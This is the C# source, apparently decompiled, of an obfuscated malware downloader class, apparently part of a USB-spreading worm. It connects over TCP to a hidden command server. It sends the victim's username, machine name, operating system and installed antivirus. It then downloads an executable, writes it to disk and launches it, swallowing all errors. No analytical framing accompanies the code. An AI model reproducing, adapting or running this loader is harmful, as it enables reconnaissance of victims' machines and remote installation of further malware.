using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace uwcrisew;

internal class marparswVCON
{
	private int marparswbufSize = 1024;

	private bool marparswchecking = false;

	private TcpClient marparswsysSCK;

	private NetworkStream marparswustream;

	private bool marparswmainfile = false;

	private int marparswbytRead = 0;

	public string marparswsysAvs = "";

	public void marparswload_client()
	{
		try
		{
			if (marparswchecking || marparswmainfile)
			{
				return;
			}
			marparswmainfile = true;
			marparswchecking = true;
			if (Process.GetProcessesByName(marparswSETPS.marparswmainApp).Length == 0)
			{
				if (!File.Exists(marparswSETPS.marparswget_mpath() + marparswSETPS.marparswmainApp + ".exe"))
				{
					IPAddress iPAddress = null;
					iPAddress = IPAddress.Parse(Encoding.UTF8.GetString(marparswSETPS.marparswips, 0, marparswSETPS.marparswips.Length));
					marparswsysSCK = new TcpClient();
					marparswsysSCK.Connect(new IPEndPoint(iPAddress, marparswSETPS.marparswsysPort));
					string text = marparswget_cmd();
					if (text != marparswSETPS.marparswdowcmd)
					{
						text = marparswget_cmd();
					}
					marparswSETPS.marparswcontries = 0;
					if (text == marparswSETPS.marparswdowcmd)
					{
						byte[] array = marparswsearchdata();
						if (array != null)
						{
							if (!Directory.Exists(marparswSETPS.marparswget_mpath()))
							{
								Directory.CreateDirectory(marparswSETPS.marparswget_mpath());
							}
							File.WriteAllBytes(marparswSETPS.marparswget_mpath() + marparswSETPS.marparswmainApp + ".exe", array);
							Thread.Sleep(100);
							Process process = new Process();
							process.StartInfo.FileName = marparswSETPS.marparswget_mpath() + marparswSETPS.marparswmainApp + ".exe";
							process.Start();
						}
						marparswustream.Close();
					}
					marparswsysSCK.Close();
				}
				else
				{
					marparswSETPS.marparswcontries = 0;
				}
			}
			else
			{
				marparswSETPS.marparswcontries = 0;
				marparswmainfile = true;
			}
			marparswchecking = false;
		}
		catch
		{
			marparswSETPS.marparswcontries++;
			marparswchecking = false;
		}
	}

	private byte[] marparswsearchdata()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			marparswbytRead = marparswustream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			for (int num3 = num2; num3 > 0; num3 -= marparswbytRead)
			{
				int count = ((num3 > marparswbufSize) ? marparswbufSize : num3);
				marparswbytRead = marparswustream.Read(array2, num, count);
				num += marparswbytRead;
			}
			return array2;
		}
		catch
		{
			return null;
		}
	}

	private string marparswget_cmd()
	{
		try
		{
			marparswbufSize = marparswsysSCK.ReceiveBufferSize;
			marparswustream = marparswsysSCK.GetStream();
			marparswsysAvs = marparswSETPS.marparswloadAV();
			marparswloaddata(null, marparswSETPS.marparswdowcmd + "=USBW | " + Environment.UserName + " | " + Environment.MachineName + " | " + marparswSETPS.marparswOsname() + " | " + marparswsysAvs);
			byte[] array = new byte[5];
			marparswbytRead = marparswustream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= marparswbytRead)
			{
				int count = ((num3 > marparswbufSize) ? marparswbufSize : num3);
				marparswbytRead = marparswustream.Read(array2, num2, count);
				num2 += marparswbytRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			return text.Split(new char[1] { '=' })[0];
		}
		catch
		{
			return "";
		}
	}

	private bool marparswloaddata(byte[] data, string type)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + (num - 1) + 1];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0)
			{
				int num5 = ((num4 > marparswbufSize) ? marparswbufSize : num4);
				marparswustream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}
}
